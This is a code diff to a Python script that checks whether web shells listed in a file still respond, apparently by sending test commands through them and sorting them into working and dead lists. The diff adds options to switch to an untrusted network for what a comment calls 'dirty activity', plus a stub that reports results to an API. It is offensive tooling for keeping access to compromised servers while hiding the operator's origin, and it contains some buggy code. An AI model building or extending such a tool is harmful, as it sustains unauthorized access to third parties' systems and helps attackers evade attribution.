@@ -1,5 +1,7 @@
 import argparse
+import os
 import sys
+import time
 
 import requests
 import pandas
@@ -25,25 +27,35 @@ file_with_not_working_shells = "not_working.txt"
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Checks shell status")
     parser.add_argument('-l', help='Path to list with web shells', required=True)
+    # blue network - trusted; red - non-trusted;
+    parser.add_argument('-blue-network', help='Network for writing results to API.', required=False)
+    parser.add_argument('-red-network', help='Network for sending requests.', required=False)
     parser.format_help()
     args = parser.parse_args()
-    if len(sys.argv) == 0 or args.l == '' or args is None:
+    # changing network for dirty activity
+    trusted_network = args.blue_network
+    non_trusted_network = args.red_network
+    shells_list = args.l
+    time.sleep(3)
+    # os.system(f"nmcli connection up {non_trusted_network}")
+    if len(sys.argv) == 0 or shells_list == '' or args is None:
         parser.print_help()
         sys.exit(1)
     if args.l.endswith('.txt'):
-        check_status_txt_file(args.l)
+        check_status_txt_file(shells_list, trusted_network)
     if args.l.endswith('.csv'):
-        check_status_csv_file(args.l)
+        check_status_csv_file(shells_list, trusted_network)
 
 
-def check_status_txt_file(path):
+def check_status_txt_file(path, trusted_network):
     with (open(path) as txt_file):
         for line in txt_file:
             send_requests_and_check_responses(line)
     txt_file.close()
+    write_results_to_api_service(trusted_network)
 
 
-def check_status_csv_file(path):
+def check_status_csv_file(path, trusted_network):
     with (open(path, newline='') as csv_file):
         results = pandas.read_csv(csv_file, usecols=['url'])
         row_count = len(results)
@@ -51,14 +63,18 @@ def check_status_csv_file(path):
             line = results.__array__().item(index)
             send_requests_and_check_responses(line)
     csv_file.close()
+    write_results_to_api_service(trusted_network)
 
 
 def send_requests_and_check_responses(shell_url):
+    # TODO: think about change file logic open and saving data on exception
+    file = open("working.txt", "w")
     with open(file_with_working_shells, 'w') as working_shells_file:
         with open(file_with_not_working_shells, 'w') as not_working_shells_file:
             print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
 
             s = requests.Session()
+            s.max_redirects = 3
             retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
             s.mount('http://', HTTPAdapter(max_retries=retries))
             s.mount('https://', HTTPAdapter(max_retries=retries))
@@ -69,7 +85,10 @@ def send_requests_and_check_responses(shell_url):
             except requests.exceptions.ConnectionError as exception:
                 print(exception)
                 not_working_shells_file.write(shell_url + "\n")
-                pass
+            except urllib3.exceptions:
+                print("Error was occurred during execution. Check network connection.")
+                not_working_shells_file.close()
+                working_shells_file.close()
 
             contains_uid = response_text_id.find("uid")
             contains_wget_file = secret_message in response_text_wget
@@ -92,6 +111,11 @@ def send_requests_and_check_responses(shell_url):
 
     not_working_shells_file.close()
     working_shells_file.close()
+
+
+def write_results_to_api_service(trusted_network):
+    # os.system(f"nmcli connection uo {trusted_network}")
+    print("Updating result in API service...")
 
 
 def print_banner():
